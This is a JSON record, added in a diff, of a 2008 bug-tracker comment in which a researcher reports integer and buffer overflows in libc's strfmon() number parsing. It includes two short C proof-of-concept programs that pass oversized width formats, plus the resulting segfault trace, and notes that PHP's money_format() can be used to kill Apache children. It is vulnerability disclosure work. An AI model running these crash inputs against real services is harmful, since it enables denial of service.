@@ -1,0 +1,8 @@
+{
+ "id": 436377,
+ "bug_id": 121818,
+ "attachment_id": 0,
+ "creation_time": "2008-03-18T04:10:03Z",
+ "creator": "cxib@securityreason.com",
+ "text": "The main problem exists in /usr/src/lib/libc/stdlib/strfmon.c function\n\nFunction GET_NUMBER() return wrong integer\n\n#define GET_NUMBER(VAR)\tdo {\t\t\t\t\t\\\n\tVAR = 0;\t\t\t\t\t\t\\\n\twhile (isdigit((unsigned char)*fmt)) {\t\t\t\\\n\t\tVAR *= 10;\t\t\t\t\t\\\n\t\tVAR += *fmt - '0';\t\t\t\t\\\n\t\tfmt++;\t\t\t\t\t\t\\\n\t}\t\t\t\t\t\t\t\\\n} while (0)\n\n\nSo for example exploit:\n\n---Integer Overflow---\n#include \u003cstdio.h\u003e\n#include \u003cmonetary.h\u003e\n\n\nmain(){\n\tchar buff[50];\n\tchar *bux=buff;\n\tint res;\n\t\n\tres=strfmon(bux, 50, \"%#99999999999999999999n\", \"-999.999\");\n}\n---Integer Overflow---\n\nThis program will execute, long time. It is very dangerous, because a\nlot of programs (like PHP), use this function. It is possible to kill\napache childs\n\nNext example:\n---Buffer Overflow---\n#include \u003cstdio.h\u003e\n#include \u003cmonetary.h\u003e\n\n\nmain(){\n\tchar buff[50];\n\tchar *bux=buff;\n\tint res;\n\t\n\tres=strfmon(bux, 50, \"%99999999999999999999n\", \"-999.999\");\n}\n---Buffer Overflow---\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x2814e0e6 in memmove () from /lib/libc.so.7\n\nWe are waiting for fast answer, because in PHP 5.2.5 we use money_format()\nfunction with strfmon() function.\n\nBest Regards\nMaksymilian Arciemowicz\nSecurityReason\n\nFix: \n\nwe are waiting to answer.\nHow-To-Repeat: Checks integers"
+}
